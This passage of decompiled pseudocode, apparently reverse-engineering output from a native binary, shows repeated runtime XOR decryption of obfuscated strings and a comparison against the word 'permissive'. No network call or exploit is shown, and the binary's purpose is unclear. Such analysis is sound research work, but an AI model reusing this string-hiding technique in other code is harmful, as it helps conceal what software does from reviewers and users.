                                                  uVar24 >> 8) ^ bVar60,(byte)uVar24 ^ bVar59)))))))
        ;
        auVar49[8] = (byte)uVar7 ^ bVar67;
        auVar49[9] = (byte)((ulong)uVar7 >> 8) ^ bVar68;
        auVar49[10] = (byte)((ulong)uVar7 >> 0x10) ^ bVar69;
        auVar49[0xb] = (byte)((ulong)uVar7 >> 0x18) ^ bVar70;
        auVar49[0xc] = (byte)((ulong)uVar7 >> 0x20) ^ bVar71;
        auVar49[0xd] = (byte)((ulong)uVar7 >> 0x28) ^ bVar72;
        auVar49[0xe] = (byte)((ulong)uVar7 >> 0x30) ^ bVar73;
        auVar49[0xf] = (byte)((ulong)uVar7 >> 0x38) ^ bVar74;
        pbVar23[0x27] = pbVar23[0x27] ^ 0x35;
        pbVar23[0x28] = pbVar23[0x28] ^ 0xcd;
        *(long *)(pbVar23 + 8) = auVar55._8_8_;
        *(undefined8 *)pbVar23 = auVar55._0_8_;
        *(long *)(pbVar23 + 0x18) = auVar49._8_8_;
        *(undefined8 *)(pbVar23 + 0x10) = auVar49._0_8_;
        pbVar23[0x29] = pbVar23[0x29] ^ 9;
        pbVar23[0x2a] = pbVar23[0x2a] ^ 0xb1;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235f30);
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33c0;
      if (sVar27 < 0x17) {
        pbVar23 = (byte *)((ulong)&local_1178 | 1);
        local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) goto LAB_001a1e78;
      }
      else {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
LAB_001a1e78:
        pvVar31 = (void *)FUN_002295c4(&DAT_00235f30);
        memcpy(pbVar23,pvVar31,sVar27);
      }
      pbVar23[sVar27] = 0;
      FUN_00208ffc(&local_150,uVar21);
      uVar32 = (ulong)(local_150 >> 1);
      pbVar23 = (byte *)((ulong)&local_150 | 1);
      if ((local_150 & 1) != 0) {
        uVar32 = CONCAT26(uStack_142,uStack_148);
        pbVar23 = local_140;
      }
      pauVar28 = (undefined1 (*) [16])FUN_0020417c(&local_1178,pbVar23,uVar32);
      local_1140 = *(void **)pauVar28[1];
      sStack_1148 = SUB168(*pauVar28,8);
      local_1150 = SUB168(*pauVar28,0);
      *(undefined8 *)(*pauVar28 + 8) = 0;
      *(undefined8 *)pauVar28[1] = 0;
      *(undefined8 *)*pauVar28 = 0;
      if (local_11a0 < local_1198) {
        local_11a0[2] = (ulong)local_1140;
        local_11a0[1] = sStack_1148;
        *local_11a0 = local_1150;
        sStack_1148 = 0;
        local_1140 = (void *)0x0;
        local_1150 = 0;
        local_11a0 = local_11a0 + 3;
      }
      else {
        FUN_001b6204(&local_11a8,&local_1150);
        if ((local_1150 & 1) != 0) {
          free(local_1140);
        }
      }
      if ((local_150 & 1) != 0) {
        free(local_140);
      }
      puVar41 = local_11a8;
      puVar42 = local_11a0;
      if ((local_1178 & 1) != 0) {
        free(local_1168);
        puVar41 = local_11a8;
        puVar42 = local_11a0;
      }
      for (; puVar19 = local_11a0, puVar41 != local_11a0; puVar41 = puVar41 + 3) {
        local_11a0 = puVar42;
        FUN_002036bc(local_11d8,puVar41);
        uVar32 = FUN_001a68d8(param_1,local_11d8);
        if ((local_11d8[0] & 1) != 0) {
          free(local_11c8);
        }
        if ((uVar32 & 1) != 0) goto LAB_001a2678;
        puVar42 = local_11a0;
        local_11a0 = puVar19;
      }
      local_11a0 = puVar42;
      pbVar23 = (byte *)FUN_002295c4(&DAT_00235f90);
      if ((*pbVar23 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235f70);
        FUN_001b5204(uVar24,&DAT_00179665);
        FUN_002234c0(&LAB_001b5368,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235f90);
        *puVar29 = 1;
        lVar25 = FUN_002295c4(&DAT_00235f70);
        cVar1 = *(char *)(lVar25 + 0x2b);
      }
      else {
        lVar25 = FUN_002295c4(&DAT_00235f70);
        cVar1 = *(char *)(lVar25 + 0x2b);
      }
      if (cVar1 != '\0') {
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235f70);
        bVar74 = UNK_0017734f;
        bVar73 = UNK_0017734e;
        bVar72 = UNK_0017734d;
        bVar71 = UNK_0017734c;
        bVar70 = UNK_0017734b;
        bVar69 = UNK_0017734a;
        bVar68 = UNK_00177349;
        bVar67 = UNK_00177348;
        bVar66 = UNK_00177347;
        bVar65 = UNK_00177346;
        bVar64 = UNK_00177345;
        bVar63 = UNK_00177344;
        bVar62 = UNK_00177343;
        bVar61 = UNK_00177342;
        bVar60 = UNK_00177341;
        bVar59 = DAT_00177340;
        pbVar23[0x2b] = 0;
        pbVar23[0x20] = pbVar23[0x20] ^ 0xe5;
        pbVar23[0x23] = pbVar23[0x23] ^ 0x61;
        uVar7 = *(undefined8 *)(pbVar23 + 0x18);
        uVar24 = *(undefined8 *)(pbVar23 + 0x10);
        pbVar23[0x22] = pbVar23[0x22] ^ 0xb;
        pbVar23[0x24] = pbVar23[0x24] ^ 0x87;
        pbVar23[0x21] = pbVar23[0x21] ^ 0xf3;
        auVar56._0_8_ =
             CONCAT17(pbVar23[7] ^ bVar66,
                      CONCAT16(pbVar23[6] ^ bVar65,
                               CONCAT15(pbVar23[5] ^ bVar64,
                                        CONCAT14(pbVar23[4] ^ bVar63,
                                                 CONCAT13(pbVar23[3] ^ bVar62,
                                                          CONCAT12(pbVar23[2] ^ bVar61,
                                                                   CONCAT11(pbVar23[1] ^ bVar60,
                                                                            *pbVar23 ^ bVar59)))))))
        ;
        auVar56[8] = pbVar23[8] ^ bVar67;
        auVar56[9] = pbVar23[9] ^ bVar68;
        auVar56[10] = pbVar23[10] ^ bVar69;
        auVar56[0xb] = pbVar23[0xb] ^ bVar70;
        auVar56[0xc] = pbVar23[0xc] ^ bVar71;
        auVar56[0xd] = pbVar23[0xd] ^ bVar72;
        auVar56[0xe] = pbVar23[0xe] ^ bVar73;
        auVar56[0xf] = pbVar23[0xf] ^ bVar74;
        pbVar23[0x25] = pbVar23[0x25] ^ 0x93;
        auVar50._0_8_ =
             CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ bVar66,
                      CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ bVar65,
                               CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ bVar64,
                                        CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ bVar63,
                                                 CONCAT13((byte)((ulong)uVar24 >> 0x18) ^ bVar62,
                                                          CONCAT12((byte)((ulong)uVar24 >> 0x10) ^
                                                                   bVar61,CONCAT11((byte)((ulong)
                                                  uVar24 >> 8) ^ bVar60,(byte)uVar24 ^ bVar59)))))))
        ;
        auVar50[8] = (byte)uVar7 ^ bVar67;
        auVar50[9] = (byte)((ulong)uVar7 >> 8) ^ bVar68;
        auVar50[10] = (byte)((ulong)uVar7 >> 0x10) ^ bVar69;
        auVar50[0xb] = (byte)((ulong)uVar7 >> 0x18) ^ bVar70;
        auVar50[0xc] = (byte)((ulong)uVar7 >> 0x20) ^ bVar71;
        auVar50[0xd] = (byte)((ulong)uVar7 >> 0x28) ^ bVar72;
        auVar50[0xe] = (byte)((ulong)uVar7 >> 0x30) ^ bVar73;
        auVar50[0xf] = (byte)((ulong)uVar7 >> 0x38) ^ bVar74;
        pbVar23[0x26] = pbVar23[0x26] ^ 0x2f;
        pbVar23[0x27] = pbVar23[0x27] ^ 0xdb;
        pbVar23[0x29] = pbVar23[0x29] ^ 0xf3;
        *(long *)(pbVar23 + 8) = auVar56._8_8_;
        *(undefined8 *)pbVar23 = auVar56._0_8_;
        *(long *)(pbVar23 + 0x18) = auVar50._8_8_;
        *(undefined8 *)(pbVar23 + 0x10) = auVar50._0_8_;
        pbVar23[0x28] = pbVar23[0x28] ^ 0xe5;
        pbVar23[0x2a] = pbVar23[0x2a] ^ 0xb;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235f70);
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33d4;
      if (sVar27 < 0x17) {
        pvVar31 = (void *)((ulong)&local_1150 | 1);
        local_1150 = CONCAT71(local_1150._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) {
          puVar30 = &DAT_00235f70;
          goto LAB_001a26ec;
        }
        goto LAB_001a2700;
      }
      uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
      pvVar31 = (void *)FUN_00202bc0(uVar32);
      puVar30 = &DAT_00235f70;
LAB_001a26e8:
      local_1150 = uVar32 | 1;
      sStack_1148 = sVar27;
      local_1140 = pvVar31;
    }
LAB_001a26ec:
    __src = (void *)FUN_002295c4(puVar30);
    memcpy(pvVar31,__src,sVar27);
  }
  else {
    if (CONCAT53(uStack_12d,local_130) == 0x697373696d726570 &&
        CONCAT35(uStack_128,uStack_12d) == 0x6576697373696d) {
      pbVar23 = (byte *)FUN_002295c4(&DAT_00235d90);
      if ((*pbVar23 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235d70);
        FUN_001b4788(uVar24,&DAT_00179532);
        FUN_002234c0(&LAB_001b492c,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235d90);
        *puVar29 = 1;
        lVar25 = FUN_002295c4(&DAT_00235d70);
        cVar1 = *(char *)(lVar25 + 0x33);
      }
      else {
        lVar25 = FUN_002295c4(&DAT_00235d70);
        cVar1 = *(char *)(lVar25 + 0x33);
      }
      if (cVar1 != '\0') {
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235d70);
        uVar7 = *(undefined8 *)(pbVar23 + 0x18);
        uVar24 = *(undefined8 *)(pbVar23 + 0x10);
        pbVar23[0x33] = 0;
        uVar37 = *(undefined8 *)(pbVar23 + 0x28);
        uVar35 = *(undefined8 *)(pbVar23 + 0x20);
        auVar53._0_8_ =
             CONCAT17(pbVar23[7] ^ UNK_00177737,
                      CONCAT16(pbVar23[6] ^ UNK_00177736,
                               CONCAT15(pbVar23[5] ^ UNK_00177735,
                                        CONCAT14(pbVar23[4] ^ UNK_00177734,
                                                 CONCAT13(pbVar23[3] ^ UNK_00177733,
                                                          CONCAT12(pbVar23[2] ^ UNK_00177732,
                                                                   CONCAT11(pbVar23[1] ^
                                                                            UNK_00177731,
                                                                            *pbVar23 ^ DAT_00177730)
                                                                  ))))));
        auVar53[8] = pbVar23[8] ^ UNK_00177738;
        auVar53[9] = pbVar23[9] ^ UNK_00177739;
        auVar53[10] = pbVar23[10] ^ UNK_0017773a;
        auVar53[0xb] = pbVar23[0xb] ^ UNK_0017773b;
        auVar53[0xc] = pbVar23[0xc] ^ UNK_0017773c;
        auVar53[0xd] = pbVar23[0xd] ^ UNK_0017773d;
        auVar53[0xe] = pbVar23[0xe] ^ UNK_0017773e;
        auVar53[0xf] = pbVar23[0xf] ^ UNK_0017773f;
        bVar59 = (byte)uVar24 ^ DAT_00177730;
        bVar60 = (byte)((ulong)uVar24 >> 8) ^ UNK_00177731;
        bVar61 = (byte)((ulong)uVar24 >> 0x10) ^ UNK_00177732;
        bVar62 = (byte)((ulong)uVar24 >> 0x18) ^ UNK_00177733;
        bVar63 = (byte)((ulong)uVar24 >> 0x20) ^ UNK_00177734;
        bVar64 = (byte)((ulong)uVar24 >> 0x28) ^ UNK_00177735;
        bVar65 = (byte)((ulong)uVar24 >> 0x30) ^ UNK_00177736;
        bVar66 = (byte)((ulong)uVar24 >> 0x38) ^ UNK_00177737;
        bVar67 = (byte)uVar7 ^ UNK_00177738;
        bVar68 = (byte)((ulong)uVar7 >> 8) ^ UNK_00177739;
        bVar69 = (byte)((ulong)uVar7 >> 0x10) ^ UNK_0017773a;
        bVar70 = (byte)((ulong)uVar7 >> 0x18) ^ UNK_0017773b;
        bVar71 = (byte)((ulong)uVar7 >> 0x20) ^ UNK_0017773c;
        bVar72 = (byte)((ulong)uVar7 >> 0x28) ^ UNK_0017773d;
        bVar73 = (byte)((ulong)uVar7 >> 0x30) ^ UNK_0017773e;
        bVar74 = (byte)((ulong)uVar7 >> 0x38) ^ UNK_0017773f;
        auVar47._0_8_ =
             CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ UNK_00177737,
                      CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ UNK_00177736,
                               CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ UNK_00177735,
                                        CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ UNK_00177734,
                                                 CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                          UNK_00177733,
                                                          CONCAT12((byte)((ulong)uVar35 >> 0x10) ^
                                                                   UNK_00177732,
                                                                   CONCAT11((byte)((ulong)uVar35 >>
                                                                                  8) ^ UNK_00177731,
                                                                            (byte)uVar35 ^
                                                                            DAT_00177730)))))));
        auVar47[8] = (byte)uVar37 ^ UNK_00177738;
        auVar47[9] = (byte)((ulong)uVar37 >> 8) ^ UNK_00177739;
        auVar47[10] = (byte)((ulong)uVar37 >> 0x10) ^ UNK_0017773a;
        auVar47[0xb] = (byte)((ulong)uVar37 >> 0x18) ^ UNK_0017773b;
        auVar47[0xc] = (byte)((ulong)uVar37 >> 0x20) ^ UNK_0017773c;
        auVar47[0xd] = (byte)((ulong)uVar37 >> 0x28) ^ UNK_0017773d;
        auVar47[0xe] = (byte)((ulong)uVar37 >> 0x30) ^ UNK_0017773e;
        auVar47[0xf] = (byte)((ulong)uVar37 >> 0x38) ^ UNK_0017773f;
        pbVar23[0x30] = pbVar23[0x30] ^ 0x5d;
        pbVar23[0x31] = pbVar23[0x31] ^ 0xe9;
        *(long *)(pbVar23 + 8) = auVar53._8_8_;
        *(undefined8 *)pbVar23 = auVar53._0_8_;
        *(ulong *)(pbVar23 + 0x18) =
             CONCAT17(bVar74,CONCAT16(bVar73,CONCAT15(bVar72,CONCAT14(bVar71,CONCAT13(bVar70,
                                                  CONCAT12(bVar69,CONCAT11(bVar68,bVar67)))))));
        *(ulong *)(pbVar23 + 0x10) =
             CONCAT17(bVar66,CONCAT16(bVar65,CONCAT15(bVar64,CONCAT14(bVar63,CONCAT13(bVar62,
                                                  CONCAT12(bVar61,CONCAT11(bVar60,bVar59)))))));
        *(long *)(pbVar23 + 0x28) = auVar47._8_8_;
        *(undefined8 *)(pbVar23 + 0x20) = auVar47._0_8_;
        pbVar23[0x32] = pbVar23[0x32] ^ 0x2f;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235d70);
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33c0;
      if (sVar27 < 0x17) {
        pbVar23 = (byte *)((ulong)&local_1178 | 1);
        local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) goto LAB_001a20f8;
      }
      else {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
LAB_001a20f8:
        pvVar31 = (void *)FUN_002295c4(&DAT_00235d70);
        memcpy(pbVar23,pvVar31,sVar27);
      }
      pbVar23[sVar27] = 0;
      FUN_00208ffc(&local_150,uVar21);
      uVar32 = (ulong)(local_150 >> 1);
      pbVar23 = (byte *)((ulong)&local_150 | 1);
      if ((local_150 & 1) != 0) {
        uVar32 = CONCAT26(uStack_142,uStack_148);
        pbVar23 = local_140;
      }
      pauVar28 = (undefined1 (*) [16])FUN_0020417c(&local_1178,pbVar23,uVar32);
      local_1140 = *(void **)pauVar28[1];
      sStack_1148 = SUB168(*pauVar28,8);
      local_1150 = SUB168(*pauVar28,0);
      *(undefined8 *)(*pauVar28 + 8) = 0;
      *(undefined8 *)pauVar28[1] = 0;
      *(undefined8 *)*pauVar28 = 0;
      if (local_11a0 < local_1198) {
        local_11a0[2] = (ulong)local_1140;
        local_11a0[1] = sStack_1148;
        *local_11a0 = local_1150;
        sStack_1148 = 0;
        local_1140 = (void *)0x0;
        local_1150 = 0;
        local_11a0 = local_11a0 + 3;
joined_r0x001a30d4:
        if ((local_150 & 1) == 0) goto LAB_001a2234;
LAB_001a21a0:
        free(local_140);
        if ((local_1178 & 1) == 0) goto LAB_001a223c;
LAB_001a21b0:
        free(local_1168);
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235dd0);
        bVar59 = *pbVar23;
      }
      else {
        FUN_001b6204(&local_11a8,&local_1150);
        if ((local_1150 & 1) != 0) {
          free(local_1140);
          goto joined_r0x001a30d4;
        }
        if ((local_150 & 1) != 0) goto LAB_001a21a0;
LAB_001a2234:
        if ((local_1178 & 1) != 0) goto LAB_001a21b0;
LAB_001a223c:
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235dd0);
        bVar59 = *pbVar23;
      }
      if ((bVar59 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235db0);
        FUN_001b4940(uVar24,&DAT_00179565);
        FUN_002234c0(&LAB_001b4a2c,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235dd0);
        *puVar29 = 1;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235db0);
      FUN_001b6380();
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33c0;
      if (sVar27 < 0x17) {
        pbVar23 = (byte *)((ulong)&local_1178 | 1);
        local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) goto LAB_001a22b8;
      }
      else {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
LAB_001a22b8:
        pvVar31 = (void *)FUN_002295c4(&DAT_00235db0);
        memcpy(pbVar23,pvVar31,sVar27);
      }
      pbVar23[sVar27] = 0;
      FUN_00208ffc(&local_150,uVar21);
      uVar32 = (ulong)(local_150 >> 1);
      pbVar23 = (byte *)((ulong)&local_150 | 1);
      if ((local_150 & 1) != 0) {
        uVar32 = CONCAT26(uStack_142,uStack_148);
        pbVar23 = local_140;
      }
      pauVar28 = (undefined1 (*) [16])FUN_0020417c(&local_1178,pbVar23,uVar32);
      local_1140 = *(void **)pauVar28[1];
      sStack_1148 = SUB168(*pauVar28,8);
      local_1150 = SUB168(*pauVar28,0);
      *(undefined8 *)(*pauVar28 + 8) = 0;
      *(undefined8 *)pauVar28[1] = 0;
      *(undefined8 *)*pauVar28 = 0;
      if (local_11a0 < local_1198) {
        local_11a0[2] = (ulong)local_1140;
        local_11a0[1] = sStack_1148;
        *local_11a0 = local_1150;
        sStack_1148 = 0;
        local_1140 = (void *)0x0;
        local_1150 = 0;
        local_11a0 = local_11a0 + 3;
joined_r0x001a30e8:
        if ((local_150 & 1) == 0) goto LAB_001a23f4;
LAB_001a2360:
        free(local_140);
        if ((local_1178 & 1) == 0) goto LAB_001a23fc;
LAB_001a2370:
        free(local_1168);
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235e10);
        bVar59 = *pbVar23;
      }
      else {
        FUN_001b6204(&local_11a8,&local_1150);
        if ((local_1150 & 1) != 0) {
          free(local_1140);
          goto joined_r0x001a30e8;
        }
        if ((local_150 & 1) != 0) goto LAB_001a2360;
LAB_001a23f4:
        if ((local_1178 & 1) != 0) goto LAB_001a2370;
LAB_001a23fc:
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235e10);
        bVar59 = *pbVar23;
      }
      if ((bVar59 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235df0);
        FUN_001b4a3c(uVar24,&DAT_00179581);
        FUN_002234c0(&LAB_001b4ae8,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235e10);
        *puVar29 = 1;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235df0);
      FUN_001b63f4();
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33c0;
      if (0x16 < sVar27) {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
LAB_001a2478:
        puVar30 = &DAT_00235df0;
        goto LAB_001a2480;
      }
      pbVar23 = (byte *)((ulong)&local_1178 | 1);
      local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
      if (sVar27 != 0) goto LAB_001a2478;
    }
    else {
      pbVar23 = (byte *)FUN_002295c4(&DAT_00235e50);
      if ((*pbVar23 & 1) == 0) {
        uVar24 = FUN_002295c4(&DAT_00235e30);
        FUN_001b4af4(uVar24,&DAT_00179595);
        FUN_002234c0(&LAB_001b4c98,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235e50);
        *puVar29 = 1;
        lVar25 = FUN_002295c4(&DAT_00235e30);
        cVar1 = *(char *)(lVar25 + 0x33);
      }
      else {
        lVar25 = FUN_002295c4(&DAT_00235e30);
        cVar1 = *(char *)(lVar25 + 0x33);
      }
      if (cVar1 != '\0') {
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235e30);
        uVar7 = *(undefined8 *)(pbVar23 + 0x18);
        uVar24 = *(undefined8 *)(pbVar23 + 0x10);
        pbVar23[0x33] = 0;
        uVar37 = *(undefined8 *)(pbVar23 + 0x28);
        uVar35 = *(undefined8 *)(pbVar23 + 0x20);
        auVar52._0_8_ =
             CONCAT17(pbVar23[7] ^ UNK_00177887,
                      CONCAT16(pbVar23[6] ^ UNK_00177886,
                               CONCAT15(pbVar23[5] ^ UNK_00177885,
                                        CONCAT14(pbVar23[4] ^ UNK_00177884,
                                                 CONCAT13(pbVar23[3] ^ UNK_00177883,
                                                          CONCAT12(pbVar23[2] ^ UNK_00177882,
                                                                   CONCAT11(pbVar23[1] ^
                                                                            UNK_00177881,
                                                                            *pbVar23 ^ DAT_00177880)
                                                                  ))))));
        auVar52[8] = pbVar23[8] ^ UNK_00177888;
        auVar52[9] = pbVar23[9] ^ UNK_00177889;
        auVar52[10] = pbVar23[10] ^ UNK_0017788a;
        auVar52[0xb] = pbVar23[0xb] ^ UNK_0017788b;
        auVar52[0xc] = pbVar23[0xc] ^ UNK_0017788c;
        auVar52[0xd] = pbVar23[0xd] ^ UNK_0017788d;
        auVar52[0xe] = pbVar23[0xe] ^ UNK_0017788e;
        auVar52[0xf] = pbVar23[0xf] ^ UNK_0017788f;
        bVar59 = (byte)uVar24 ^ DAT_00177880;
        bVar60 = (byte)((ulong)uVar24 >> 8) ^ UNK_00177881;
        bVar61 = (byte)((ulong)uVar24 >> 0x10) ^ UNK_00177882;
        bVar62 = (byte)((ulong)uVar24 >> 0x18) ^ UNK_00177883;
        bVar63 = (byte)((ulong)uVar24 >> 0x20) ^ UNK_00177884;
        bVar64 = (byte)((ulong)uVar24 >> 0x28) ^ UNK_00177885;
        bVar65 = (byte)((ulong)uVar24 >> 0x30) ^ UNK_00177886;
        bVar66 = (byte)((ulong)uVar24 >> 0x38) ^ UNK_00177887;
        bVar67 = (byte)uVar7 ^ UNK_00177888;
        bVar68 = (byte)((ulong)uVar7 >> 8) ^ UNK_00177889;
        bVar69 = (byte)((ulong)uVar7 >> 0x10) ^ UNK_0017788a;
        bVar70 = (byte)((ulong)uVar7 >> 0x18) ^ UNK_0017788b;
        bVar71 = (byte)((ulong)uVar7 >> 0x20) ^ UNK_0017788c;
        bVar72 = (byte)((ulong)uVar7 >> 0x28) ^ UNK_0017788d;
        bVar73 = (byte)((ulong)uVar7 >> 0x30) ^ UNK_0017788e;
        bVar74 = (byte)((ulong)uVar7 >> 0x38) ^ UNK_0017788f;
        auVar46._0_8_ =
             CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ UNK_00177887,
                      CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ UNK_00177886,
                               CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ UNK_00177885,
                                        CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ UNK_00177884,
                                                 CONCAT13((byte)((ulong)uVar35 >> 0x18) ^
                                                          UNK_00177883,
                                                          CONCAT12((byte)((ulong)uVar35 >> 0x10) ^
                                                                   UNK_00177882,
                                                                   CONCAT11((byte)((ulong)uVar35 >>
                                                                                  8) ^ UNK_00177881,
                                                                            (byte)uVar35 ^
                                                                            DAT_00177880)))))));
        auVar46[8] = (byte)uVar37 ^ UNK_00177888;
        auVar46[9] = (byte)((ulong)uVar37 >> 8) ^ UNK_00177889;
        auVar46[10] = (byte)((ulong)uVar37 >> 0x10) ^ UNK_0017788a;
        auVar46[0xb] = (byte)((ulong)uVar37 >> 0x18) ^ UNK_0017788b;
        auVar46[0xc] = (byte)((ulong)uVar37 >> 0x20) ^ UNK_0017788c;
        auVar46[0xd] = (byte)((ulong)uVar37 >> 0x28) ^ UNK_0017788d;
        auVar46[0xe] = (byte)((ulong)uVar37 >> 0x30) ^ UNK_0017788e;
        auVar46[0xf] = (byte)((ulong)uVar37 >> 0x38) ^ UNK_0017788f;
        pbVar23[0x30] = pbVar23[0x30] ^ 0x4b;
        pbVar23[0x31] = pbVar23[0x31] ^ 0xf1;
        *(long *)(pbVar23 + 8) = auVar52._8_8_;
        *(undefined8 *)pbVar23 = auVar52._0_8_;
        *(ulong *)(pbVar23 + 0x18) =
             CONCAT17(bVar74,CONCAT16(bVar73,CONCAT15(bVar72,CONCAT14(bVar71,CONCAT13(bVar70,
                                                  CONCAT12(bVar69,CONCAT11(bVar68,bVar67)))))));
        *(ulong *)(pbVar23 + 0x10) =
             CONCAT17(bVar66,CONCAT16(bVar65,CONCAT15(bVar64,CONCAT14(bVar63,CONCAT13(bVar62,
                                                  CONCAT12(bVar61,CONCAT11(bVar60,bVar59)))))));
        *(long *)(pbVar23 + 0x28) = auVar46._8_8_;
        *(undefined8 *)(pbVar23 + 0x20) = auVar46._0_8_;
        pbVar23[0x32] = pbVar23[0x32] ^ 0x7d;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235e30);
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) goto LAB_001a33c0;
      if (sVar27 < 0x17) {
        pbVar23 = (byte *)((ulong)&local_1178 | 1);
        local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 != 0) goto LAB_001a18d0;
      }
      else {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
LAB_001a18d0:
        pvVar31 = (void *)FUN_002295c4(&DAT_00235e30);
        memcpy(pbVar23,pvVar31,sVar27);
      }
      pbVar23[sVar27] = 0;
      FUN_00208ffc(&local_150,uVar21);
      uVar32 = (ulong)(local_150 >> 1);
      pbVar23 = (byte *)((ulong)&local_150 | 1);
      if ((local_150 & 1) != 0) {
        uVar32 = CONCAT26(uStack_142,uStack_148);
        pbVar23 = local_140;
      }
      pauVar28 = (undefined1 (*) [16])FUN_0020417c(&local_1178,pbVar23,uVar32);
      local_1140 = *(void **)pauVar28[1];
      sStack_1148 = SUB168(*pauVar28,8);
      local_1150 = SUB168(*pauVar28,0);
      *(undefined8 *)(*pauVar28 + 8) = 0;
      *(undefined8 *)pauVar28[1] = 0;
      *(undefined8 *)*pauVar28 = 0;
      if (local_11a0 < local_1198) {
        local_11a0[2] = (ulong)local_1140;
        local_11a0[1] = sStack_1148;
        *local_11a0 = local_1150;
        sStack_1148 = 0;
        local_1140 = (void *)0x0;
        local_1150 = 0;
        local_11a0 = local_11a0 + 3;
joined_r0x001a3098:
        if ((local_150 & 1) == 0) goto LAB_001a1a20;
LAB_001a1978:
        free(local_140);
        if ((local_1178 & 1) == 0) goto LAB_001a1a28;
LAB_001a1988:
        free(local_1168);
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235e90);
        if ((*pbVar23 & 1) != 0) goto LAB_001a1a3c;
LAB_001a19a4:
        uVar24 = FUN_002295c4(&DAT_00235e70);
        FUN_001b4cac(uVar24,&DAT_001795c8);
        FUN_002234c0(&LAB_001b4e10,uVar24,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235e90);
        *puVar29 = 1;
        lVar25 = FUN_002295c4(&DAT_00235e70);
        cVar1 = *(char *)(lVar25 + 0x2b);
      }
      else {
        FUN_001b6204(&local_11a8,&local_1150);
        if ((local_1150 & 1) != 0) {
          free(local_1140);
          goto joined_r0x001a3098;
        }
        if ((local_150 & 1) != 0) goto LAB_001a1978;
LAB_001a1a20:
        if ((local_1178 & 1) != 0) goto LAB_001a1988;
LAB_001a1a28:
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235e90);
        if ((*pbVar23 & 1) == 0) goto LAB_001a19a4;
LAB_001a1a3c:
        lVar25 = FUN_002295c4(&DAT_00235e70);
        cVar1 = *(char *)(lVar25 + 0x2b);
      }
      if (cVar1 != '\0') {
        pbVar23 = (byte *)FUN_002295c4(&DAT_00235e70);
        bVar74 = UNK_0017779f;
        bVar73 = UNK_0017779e;
        bVar72 = UNK_0017779d;
        bVar71 = UNK_0017779c;
        bVar70 = UNK_0017779b;
        bVar69 = UNK_0017779a;
        bVar68 = UNK_00177799;
        bVar67 = UNK_00177798;
        bVar66 = UNK_00177797;
        bVar65 = UNK_00177796;
        bVar64 = UNK_00177795;
